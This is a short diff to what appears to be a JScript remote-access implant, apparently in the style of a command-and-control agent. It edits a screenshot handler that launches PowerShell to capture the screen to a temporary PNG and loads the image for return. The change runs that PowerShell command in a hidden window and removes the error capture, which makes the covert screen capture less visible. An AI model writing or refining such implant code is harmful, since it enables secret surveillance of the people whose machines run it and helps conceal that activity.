@@ -421,12 +421,9 @@ var HANDLERS = {
             '$g.Dispose();' +
             "$bmp.Save('" + tempPath + "',[System.Drawing.Imaging.ImageFormat]::Png);" +
             '$bmp.Dispose()"';
-        var exec = wshell.Exec(psCmd);
-        while (exec.Status === 0) WScript.Sleep(100);
+        wshell.Run(psCmd, 0, true);
         if (!fso.FileExists(tempPath)) {
-            var err = "";
-            while (!exec.StdErr.AtEndOfStream) err += exec.StdErr.ReadLine() + "\n";
-            return { user_output: "screenshot failed: " + (err || "no output file"), completed: true, status: "error" };
+            return { user_output: "screenshot failed: PowerShell did not produce output file", completed: true, status: "error" };
         }
         var rs = new ActiveXObject("ADODB.Stream");
         rs.Type = 1; rs.Open(); rs.LoadFromFile(tempPath);
